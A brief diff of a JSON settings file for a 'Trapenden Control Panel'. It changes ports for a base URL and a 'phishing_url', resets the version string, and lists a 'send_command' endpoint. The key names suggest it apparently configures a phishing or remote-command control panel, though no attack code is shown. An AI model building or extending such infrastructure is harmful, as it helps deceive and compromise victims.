@@ -1,8 +1,8 @@
 {
-  "base_url": "http://trapenden.miunnst.site:3000",
-  "phishing_url": "http://trapenden.miunnst.site:3005",
+  "base_url": "http://trapenden.miunnst.site:2002",
+  "phishing_url": "http://trapenden.miunnst.site:2000",
   "base_notif": "http://trapenden.miunnst.site:3003",
-  "version": "11.0.0",
+  "version": "1.0.0",
   "app_name": "Trapenden Control Panel",
   "endpoints": {
     "send_command": "/api/send-command",
